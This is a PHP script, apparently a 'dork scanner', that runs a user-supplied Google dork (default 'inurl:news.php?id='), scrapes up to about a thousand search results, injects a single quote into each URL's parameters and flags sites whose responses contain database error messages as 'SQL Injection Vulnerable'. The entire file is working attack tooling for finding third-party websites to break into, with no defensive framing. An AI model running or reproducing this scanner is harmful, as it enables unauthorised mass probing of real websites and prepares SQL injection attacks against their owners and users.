<?php
echo "<form action='' method='POST'>";
echo "<b>Dork</b>: <p><input type='text' name='dork' value='inurl:news.php?id='></p>";
echo "<input type='submit' value='Search'>";
echo "<hr><br />";

if(@$_POST['dork']) {

	@set_time_limit(0);
	@error_reporting(0);
	@ignore_user_abort(true);
	ini_set('memory_limit', '128M');
	
	$google = "http://www.google.com/cse?cx=013269018370076798483%3Awdba3dlnxqm&q=REPLACE_DORK&num=100&hl=en&as_qdr=all&start=REPLACE_START&sa=N";
	
	$i = 0;
	$a = 0;
	$b = 0;
	
	while($b <= 900) {
	    $a = 0;
	    
	    flush(); ob_flush();
	    echo "Pages: [ ".htmlspecialchars($b)." ]<br />";
	    echo "Dork: [ <b>".htmlspecialchars(@$_POST['dork'])."</b> ]<br />";
	    echo "Getting Result from Google...<br />";
	    flush(); ob_flush();
	    
	    if(preg_match("/did not match any documents/", Connect_Host(str_replace(array("REPLACE_DORK", "REPLACE_START"), array("".$_POST['dork']."", "$b"), $google)), $val)) {
	        echo  "No Result Found<br />";
	        flush(); ob_flush();
	        break;
	    }
	    
		preg_match_all("/<h2 class=(.*?)><a href=\"(.*?)\" class=(.*?)>/", Connect_Host(str_replace(array("REPLACE_DORK", "REPLACE_START"), array("".$_POST['dork']."", "$b"), $google)), $sites);
	    echo "Scanning...<br />";
	    flush(); ob_flush();
	     
		while(1) {
	
		    if(preg_match("/You have an error in your SQL|Division by zero in|supplied argument is not a valid MySQL result resource in|Call to a member function|Microsoft JET Database|ODBC Microsoft Access Driver|Microsoft OLE DB Provider for SQL Server|Unclosed quotation mark|Microsoft OLE DB Provider for Oracle|Incorrect syntax near|SQL query failed/", Connect_Host(str_replace("=", "='", $sites[2][$a])))) {
		        echo "<a href='".Clean(str_replace("=", "='", $sites[2][$a]))."' target='_blank'>".str_replace("=", "='", $sites[2][$a])."</a> <== <font color='green'>SQL Injection Vulnerable</font><br />";
		    } else {
		        echo "<a href='".Clean(str_replace("=", "='", $sites[2][$a]))."' target='_blank'>".str_replace("=", "='", $sites[2][$a])."</a> <== <font color='red'>Failed</font><br />";
		        flush(); ob_flush();
		    }
		    
		    if($a > count($sites[2])-2) {
		        echo "Done . . . !! <br />";
		        break;
		    }
		    
		    $a += 1;
		}
		
	    $b += 100;
	}
}
	
function Connect_Host($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $data = curl_exec($ch);
    if($data) {
        return $data;
    } else {
        return 0;
    }
}

function Clean($text) {
    return htmlspecialchars($text, ENT_QUOTES);
}

?>
